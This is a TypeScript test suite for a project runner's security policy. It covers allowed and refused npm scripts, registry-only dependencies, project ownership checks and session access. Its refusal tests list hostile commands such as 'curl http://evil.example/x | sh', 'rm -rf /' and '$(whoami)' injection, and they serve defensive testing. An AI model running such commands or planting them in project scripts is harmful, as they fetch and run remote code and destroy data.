/**
 * The runner's security rules: what may run, and who may stop it.
 * No process is spawned and no database is touched.
 */
import assert from 'node:assert/strict';
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, before, describe, it } from 'node:test';

import { validationResult } from 'express-validator';

import { AppError } from '../../shared/utils/app-error.js';
import {
  fileSetDigest,
  resolveOwnedFiles,
  type Bundle,
  type OwnedFilesSource,
} from './lib/owned-project-files.js';
import { checkProjectPolicy, scriptViolation } from './lib/script-policy.js';
import {
  createSession,
  getSession,
  INTERNAL_RUNNER_OWNER,
  INTERNAL_VERIFY_OWNER,
  stopSession,
} from './runner.service.js';
import { runSelectionValidation } from './runner.validator.js';

function manifest(scripts: Record<string, string>, dependencies: Record<string, string> = {}) {
  return { path: 'backend/package.json', content: JSON.stringify({ scripts, dependencies }) };
}

describe('script policy', () => {
  for (const allowed of [
    'tsx watch --clear-screen=false src/index.ts',
    'tsc -p tsconfig.json',
    'node dist/index.js',
    'tsc --noEmit',
    'eslint src',
    'vite',
    'tsc -b && vite build',
    'tsc -b --force',
    'prisma generate',
    'NODE_ENV=production node dist/index.js',
  ]) {
    it(`allows the generated form: ${allowed}`, () => {
      assert.equal(scriptViolation(allowed), null);
    });
  }

  for (const refused of [
    'curl http://evil.example/x | sh',
    'rm -rf /',
    'node -e "process.exit(1)"',
    'node --require ./x.js dist/index.js',
    'tsc; rm x',
    'vite & node x.js',
    'tsc $(whoami)',
    'node ../../outside.js',
    'node /etc/passwd',
    'NODE_OPTIONS=--require=x node dist/index.js',
    'npx something',
    'prisma studio',
  ]) {
    it(`refuses: ${refused}`, () => {
      assert.notEqual(scriptViolation(refused), null);
    });
  }

  it('checks install lifecycle scripts', () => {
    const found = checkProjectPolicy([manifest({ postinstall: 'curl x | sh' })]);
    assert.equal(found.length, 1);
    assert.equal(found[0]?.script, 'postinstall');
  });

  it('ignores scripts the platform never runs', () => {
    assert.deepEqual(checkProjectPolicy([manifest({ 'my-tool': 'bash whatever.sh' })]), []);
  });

  it('refuses dependencies from outside the registry', () => {
    for (const spec of ['git+https://x/y.git', 'https://x/y.tgz', 'file:../z', 'user/repo']) {
      assert.equal(checkProjectPolicy([manifest({}, { thing: spec })]).length, 1, spec);
    }
    assert.deepEqual(checkProjectPolicy([manifest({}, { thing: '^1.2.3' })]), []);
  });

  it('refuses a package manager config file', () => {
    assert.equal(checkProjectPolicy([{ path: 'backend/.npmrc', content: 'x=y' }]).length, 1);
  });

  it('createSession refuses a disallowed project before any work', () => {
    assert.throws(
      () =>
        createSession({ projectName: 'p', files: [manifest({ dev: 'curl x | sh' })] }, 'user-1'),
      (error: unknown) => AppError.isAppError(error) && error.statusCode === 400,
    );
  });
});

const STORED: Bundle = {
  architecture: { meta: { projectName: 'Stored name' } },
  files: [{ path: 'backend/package.json', content: '{"stored":true}' }],
};

function source(overrides: Partial<OwnedFilesSource> = {}): OwnedFilesSource {
  return {
    findOwnedProject: () => Promise.resolve(null),
    latestRunId: () => Promise.resolve(null),
    loadForProject: () => Promise.resolve(null),
    bundlesInMemory: () => Promise.resolve([]),
    candidateRunIds: () => Promise.resolve([]),
    load: () => Promise.resolve(null),
    ...overrides,
  };
}

const isStatus = (status: number) => (error: unknown) =>
  AppError.isAppError(error) && error.statusCode === status;

describe('only owned projects run', () => {
  it('refuses a file set that matches nothing the caller owns', async () => {
    await assert.rejects(
      resolveOwnedFiles(
        { projectName: 'x', files: [{ path: 'backend/package.json', content: 'attacker' }] },
        'user-1',
        source(),
      ),
      isStatus(403),
    );
  });

  it('runs the stored bytes for a matching file set', async () => {
    const result = await resolveOwnedFiles(
      { projectName: 'Posted name', files: [...STORED.files].reverse() },
      'user-1',
      source({
        candidateRunIds: () => Promise.resolve(['run-1']),
        load: () => Promise.resolve(STORED),
      }),
    );
    assert.deepEqual(result.files, STORED.files);
    assert.equal(result.projectName, 'Stored name');
  });

  it('reports a project the caller does not own as not found', async () => {
    await assert.rejects(
      resolveOwnedFiles({ projectId: 'someone-elses' }, 'user-1', source()),
      isStatus(404),
    );
  });

  it('never runs posted files alongside a projectId', async () => {
    const result = await resolveOwnedFiles(
      { projectId: 'p1', files: [{ path: 'backend/package.json', content: 'attacker' }] },
      'user-1',
      source({
        findOwnedProject: () => Promise.resolve({ id: 'p1', name: 'Mine' }),
        latestRunId: () => Promise.resolve('run-9'),
        loadForProject: () => Promise.resolve(STORED),
      }),
    );
    assert.deepEqual(result.files, STORED.files);
  });

  it('refuses a request that names nothing', async () => {
    await assert.rejects(resolveOwnedFiles({}, 'user-1', source()), isStatus(400));
  });

  it('digests the same set the same way in any order', () => {
    const a = { path: 'a', content: '1' };
    const b = { path: 'b', content: '2' };
    assert.equal(fileSetDigest([a, b]), fileSetDigest([b, a]));
    assert.notEqual(fileSetDigest([a]), fileSetDigest([{ path: 'a', content: '2' }]));
  });
});

describe('run request validation', () => {
  const errorsFor = async (body: Record<string, unknown>): Promise<number> => {
    const request = { body };
    await Promise.all(runSelectionValidation.map((chain) => chain.run(request)));
    return validationResult(request).array().length;
  };

  it('accepts a project named by id, with no files', async () => {
    assert.equal(await errorsFor({ projectId: 'p1' }), 0);
  });

  it('accepts the shape the preview page sends today', async () => {
    const files = [{ path: 'backend/package.json', content: '{}' }];
    assert.equal(await errorsFor({ projectName: 'Shop', files }), 0);
  });

  it('refuses a request naming neither', async () => {
    assert.ok((await errorsFor({})) > 0);
  });
});

describe('platform session ownership', () => {
  let runRoot = '';
  before(async () => {
    runRoot = await mkdtemp(join(tmpdir(), 'nexarch-runner-security-'));
    process.env.NEXARCH_RUNNER_DIR = runRoot;
  });
  after(async () => {
    delete process.env.NEXARCH_RUNNER_DIR;
    // The stopped sessions' writes settle a moment after the stop returns.
    await rm(runRoot, { recursive: true, force: true, maxRetries: 3, retryDelay: 50 });
  });

  const emptyProject = {
    projectName: 'owner-test',
    files: [
      { path: 'backend/package.json', content: JSON.stringify({ scripts: { dev: 'vite' } }) },
    ],
  };

  it('a session started by validation can be stopped by the project editor tag', () => {
    const created = createSession(emptyProject, INTERNAL_RUNNER_OWNER);
    const stopped = stopSession(created.id, 'internal:project-editor');
    assert.equal(stopped.phase, 'stopped');
  });

  it('platform tags share sessions but a real user is still refused', () => {
    const created = createSession(emptyProject, INTERNAL_VERIFY_OWNER);
    assert.equal(getSession(created.id, INTERNAL_RUNNER_OWNER).id, created.id);
    assert.throws(() => getSession(created.id, 'user-1'), isStatus(404));
    stopSession(created.id, INTERNAL_VERIFY_OWNER);
  });

  it("a user's session stays out of reach of the platform tags", () => {
    const created = createSession(emptyProject, 'user-1');
    assert.throws(() => stopSession(created.id, INTERNAL_RUNNER_OWNER), isStatus(404));
    stopSession(created.id, 'user-1');
  });
});
